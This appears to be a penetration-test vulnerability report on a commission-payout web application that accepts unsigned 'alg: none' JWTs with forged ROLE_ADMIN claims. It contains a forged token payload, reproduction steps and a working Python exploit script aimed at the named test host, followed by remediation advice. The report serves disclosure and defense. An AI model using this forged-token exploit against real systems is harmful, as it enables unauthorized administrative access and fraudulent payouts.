# JWT Algorithm Confusion and Role Escalation Enabling Unauthorized Payout Processing

**ID:** vuln-0022
**Severity:** CRITICAL
**Found:** 2026-02-26 18:10:31 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/payouts
**Method:** GET, POST
**CVE:** CVE-2015-9235
**CWE:** CWE-347
**CVSS:** 10.0

## Description

A critical JWT algorithm confusion vulnerability was discovered in the commission management application that enables unauthorized role escalation and access to sensitive payout processing functionality.

The application accepts JWT tokens with the "alg": "none" algorithm, which allows attackers to create unsigned tokens with arbitrary claims. Additionally, the application does not properly validate role claims, enabling privilege escalation to administrative roles.

This vulnerability was exploited to gain ROLE_ADMIN privileges and access payout processing functionality that should be restricted to authorized administrators only.

## Impact

Successful exploitation enables attackers to:

1. **Privilege Escalation**: Gain administrative privileges without proper authorization
2. **Unauthorized Payout Processing**: Access and manipulate payout functionality
3. **Financial Fraud**: Create, modify, or approve payouts without authorization
4. **Data Access**: View sensitive payout information from all organizations
5. **Business Logic Bypass**: Circumvent approval workflows and business rules

The vulnerability allows complete compromise of the payout processing system, enabling attackers to manipulate financial disbursements and potentially steal funds.

## Technical Analysis

**Vulnerability Mechanism:**

1. **JWT Algorithm Confusion**: The application accepts JWT tokens with "alg": "none", allowing unsigned tokens to be processed as valid. This is a well-known JWT vulnerability (CWE-347) where the application fails to properly validate the token signing algorithm.

2. **Role Claim Manipulation**: The application does not properly validate role claims in JWT tokens. Attackers can inject arbitrary role claims (e.g., "ROLE_ADMIN") that are accepted by the application.

3. **Insufficient Token Validation**: The application relies on client-provided JWT tokens without proper server-side validation of token integrity and claims.

**Proof of Concept:**

The following manipulated JWT token was used to gain administrative privileges:
```
{
  "alg": "none",
  "typ": "JWT"
}
{
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name": "attacker",
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "user-999",
  "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid": "Admin",
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/spn": "0",
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "attacker@example.com",
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/postalcode": "0",
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/stateorprovince": "Callippus",
  "access": "[\"ROLE_ADMIN\"]",
  "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "ROLE_ADMIN",
  "exp": 1803650800,
  "iss": "http://callippus.co.uk",
  "aud": "http://callippus.co.uk"
}
```

This unsigned token was accepted by the application, granting full administrative access to payout processing functionality.

## Proof of Concept

**Step-by-Step Reproduction:**

1. **Create Manipulated JWT Token**:
   - Create a JWT token with "alg": "none"
   - Inject administrative role claims: "ROLE_ADMIN"
   - Set arbitrary user identity and expiration

2. **Authenticate with Manipulated Token**:
   - Send the unsigned token in the Authorization header
   - Example: `Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.[BASE64_PAYLOAD].`

3. **Access Payout Functionality**:
   - Access payout endpoints with the manipulated token
   - Verify administrative access to payout processing
   - Test payout creation, modification, and approval

4. **Validate Unauthorized Access**:
   - Confirm access to all organizations' payout data
   - Test payout amount manipulation
   - Verify bypass of approval workflows

```
import json
import base64
import requests

# Create manipulated JWT token with admin privileges
def create_unsigned_jwt():
    # Header with alg: none
    header = {
        "alg": "none",
        "typ": "JWT"
    }

    # Payload with admin privileges
    payload = {
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name": "attacker",
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "user-999",
        "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid": "Admin",
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/spn": "0",
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "attacker@example.com",
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/postalcode": "0",
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/stateorprovince": "Callippus",
        "access": ["ROLE_ADMIN"],
        "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "ROLE_ADMIN",
        "exp": 1803650800,
        "iss": "http://callippus.co.uk",
        "aud": "http://callippus.co.uk"
    }

    # Encode header and payload
    header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

    # Create unsigned token (alg: none means no signature)
    token = f"{header_encoded}.{payload_encoded}."

    return token

# Test unauthorized access to payout functionality
def test_payout_access():
    token = create_unsigned_jwt()

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Test access to payout endpoints
    base_url = "https://commissionstest.callippus.in"

    # Test payout listing
    response = requests.get(f"{base_url}/api/payouts", headers=headers)
    print(f"Payout Listing Status: {response.status_code}")
    print(f"Payout Data Access: {len(response.text) > 100}")  # Check if we got meaningful data

    # Test payout creation (if applicable)
    # This would depend on the specific API structure
    # payload = {"amount": 10000, "organizationId": 1, "forceApprove": true}
    # response = requests.post(f"{base_url}/api/payouts", headers=headers, json=payload)

    return response.status_code == 200

if __name__ == "__main__":
    print("Testing JWT Algorithm Confusion and Role Escalation...")
    success = test_payout_access()
    print(f"Unauthorized Access Successful: {success}")
```

## Remediation

**Immediate Remediation:**

1. **Disable JWT Algorithm Confusion**:
   - Reject tokens with "alg": "none" or any unexpected algorithms
   - Implement strict algorithm validation on the server side
   - Use a whitelist of allowed algorithms (e.g., only HS256, RS256)

2. **Implement Proper Token Validation**:
   - Validate token signatures using the correct algorithm
   - Verify token integrity before processing claims
   - Implement proper token expiration validation

3. **Role Claim Validation**:
   - Validate role claims against a server-side authorization source
   - Do not trust client-provided role claims
   - Implement proper role-based access control (RBAC) checks

4. **Security Headers**:
   - Implement Content Security Policy (CSP) headers
   - Use HTTP-only, Secure, and SameSite cookie attributes
   - Implement proper CORS restrictions

**Long-Term Recommendations:**

1. **JWT Best Practices**:
   - Use strong, industry-standard algorithms (e.g., RS256)
   - Implement proper token signing with secure secrets/keys
   - Use short-lived tokens with refresh token rotation

2. **Authorization Framework**:
   - Implement a robust authorization framework
   - Use attribute-based access control (ABAC) for fine-grained permissions
   - Centralize authorization logic to prevent inconsistencies

3. **Security Testing**:
   - Conduct regular penetration testing
   - Implement automated security testing in CI/CD pipeline
   - Perform code reviews focused on authentication and authorization

4. **Monitoring and Logging**:
   - Implement comprehensive logging of authentication and authorization events
   - Set up alerts for suspicious activities (e.g., multiple failed authentication attempts)
   - Monitor for unusual access patterns

